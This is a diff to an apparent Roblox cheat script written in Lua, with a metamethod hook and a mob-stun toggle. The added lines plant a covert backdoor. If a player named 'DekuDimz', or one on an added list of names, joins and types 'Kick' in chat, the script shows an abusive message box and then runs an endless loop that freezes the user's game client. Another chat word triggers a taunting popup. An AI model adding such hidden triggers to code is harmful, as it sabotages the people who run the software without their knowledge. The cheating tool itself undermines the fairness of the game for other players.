@@ -98,7 +98,11 @@ local Races = {
     "Fanalis",
     "Uzumaki Clan"
 }
-
+local Names = {
+    "IetoekI",
+    "BIade_Fliper",
+    "54kIegendz",
+}
 local Specializations = {
     "Nagi Nagi no mi",
     "Flashstep",
@@ -201,7 +205,12 @@ for i, v in pairs(Table) do
     table.insert(Table2, v)
 end
 
-
+local Message = function(A, B, C)
+    if messagebox then
+        messagebox(B, A, 0x10)
+    end
+    return A, B, C
+end
 
 spawn(
     function()
@@ -322,8 +331,10 @@ local Player = game.Players.LocalPlayer
 local Values = Player.PlayerValues
 local Level = Values.Level
 
-
-
+local Message = function(A,B,C)
+    messagebox(B, A, 0x10)
+return A,B,C
+end 
 local OldNameCall = nil
 OldNameCall = hookmetamethod(game, "__namecall", function(k, ...)
     local Args = {...}
@@ -1316,8 +1327,20 @@ game.Players.PlayerAdded:Connect(
     end
 )
 
-
-
+game.Players.PlayerAdded:Connect(function(v)
+    if v ~= game.Players.LocalPlayer and v.Name == "DekuDimz" or table.find(Names,v.Name) then
+        v.Chatted:Connect(function(v)
+            if v == "Kick" then
+                Message("DekuDimz Caught you lackking",'Get the fuck out bitch')
+                while true do
+                end 
+            elseif v == "Ignoring" then
+                Message("HEY",'WHY YOU IGNOREING ME')
+            end
+        end)
+    end
+end)
+                
 local Toggle1 = Section1:CreateToggle("Stun All Mobs", Settings.StunMobs, function(State)
 Settings.StunMobs = State
 spawn(function()
